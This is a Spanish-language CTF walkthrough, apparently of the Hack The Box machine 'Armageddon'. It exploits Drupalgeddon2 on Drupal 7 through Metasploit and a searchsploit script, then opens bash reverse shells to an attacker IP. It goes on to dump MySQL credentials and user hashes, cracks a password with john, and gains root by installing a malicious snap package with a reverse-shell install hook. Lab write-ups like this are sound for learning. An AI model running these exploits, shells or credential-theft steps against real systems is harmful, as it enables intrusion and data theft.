PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-En el puerto 80 tenemos un **Drupal 7**

-Sabemos que está versión de Drupal es vulnerable al exploit:
	-Drupalgeddon2 (CVE-2018-7600) - RCE

### Explotación: 2 Formas

#### 1-Metasploit

-Módulo --> **exploit/unix/webapp/drupal_drupalgeddon2**
	-set rhosts 10.10.10.233
	-set lhost 10.10.14.29
	-run
		-meterpreter > bash -c 'bash -i >& /dev/tcp/10.10.14.29/443' (Nos mandamos una rs para trabajar más cómodamente)
			bash-4.2$ whoami
				Apache

#### 2-Searchsploit

-Searchsploit Drupal 7
	-searchsploit -m **php/webapps/44449.rb**

-ruby 44449.rb http://10.10.10.233/
	armageddon.htb>> bash -c 'bash -i >%26 /dev/tcp/10.10.14.29/443 0>%261'
		bash-4.2$ whoami 
			Apache

## Escalada de Privilegios

-Encontramos un archivo de configuración con credenciales para conectarnos a mysql
	-cat /var/www/html/sites/default/settings.php
		  'database' => 'drupal',
		  'username' => 'drupaluser',
		  'password' => 'CQHEy@9M*m23gBVj',

-En esta máquina no podemos hacer el tratamiento de la TTY, por lo que no podemos tener una consola interactiva de bash ni tampoco en mysql. Por eso aplicamos el siguiente comando para ejecutar comando 'sql' sin abrir la terminal de mysql:
	-mysql -udrupaluser -pCQHEy@9M*m23gBVj -e'show databases;'
		Database
		information_schema
		drupal
	-Listamos las tablas de la DB 'drupal':
		-mysql -udrupaluser -pCQHEy@9M*m23gBVj -D drupal -e'show tables;'
			-users
	-Listamos la información de la tabal 'users':
		-mysql -udrupaluser -pCQHEy@9M*m23gBVj -D drupal -e'select * from users;'
			brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt

-Rompemos el hash con john:
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		-password: booboo

-Intentamos pivotar de usuario:
	-su brucetherealadmin
	-password: booboo
	ERROR

-Probamos por ssh:
	-ssh brucetherealadmin@10.10.10.233
	-password: booboo
	[brucetherealadmin@armageddon ~]$ whoami
	brucetherealadmin
	(HEMOS PIVOTADO DE USUARIO POR SSH!!)

-Permisos del usuario 'brucetherealadmin':
	-sudo -l:
		(root) NOPASSWD: /usr/bin/snap install *

-Nos vamos a **Gtfobins** y nos dice lo siguiente:
	-Hay que generar un archivo .snap malicioso en nuestra máquina, subirlo a la máquina víctima y ejecutarlo par escalar a root.

**-Explotación:**
	1-Intalamos el binario fpm en nuestra máquina:
		-sudo gem install --no-document fpm
	2-Copiamos los comandos de **'Gtfobins'** para generar el .snap malicioso. 
		**-NOTA:** Cambiamos el comando a ejecutar 'id' por una reverse shell
			COMMAND="bash -c 'bash -i >& /dev/tcp/10.10.14.29/1234 0>&1'"
			❯ d $(mktemp -d)
			mkdir -p meta/hooks
			printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
			chmod +x meta/hooks/install
			fpm -n xxxx -s dir -t snap -a all meta
	3-Descargamos el .snap en /tmp de la máquina víctima. La máquina no tiene **'wget'** ni **'nc'**, por lo que le pasamos el archivo con 'curl':
		-Nuestra máquina: python3 -m http.server 80
		-Máquina víctima: 
			-curl http://10.10.14.29/xxxx_1.0_all.snap -o xxxx_1.0_all.snap
	4-Nos ponemos en escucha en nuestra máquina y ejecutamos el binario en la máquina víctima de la siguiente forma:
		-sudo snap install xxxx_1.0_all.snap --dangerous --devmode
			bash-4.3# whoami
			root







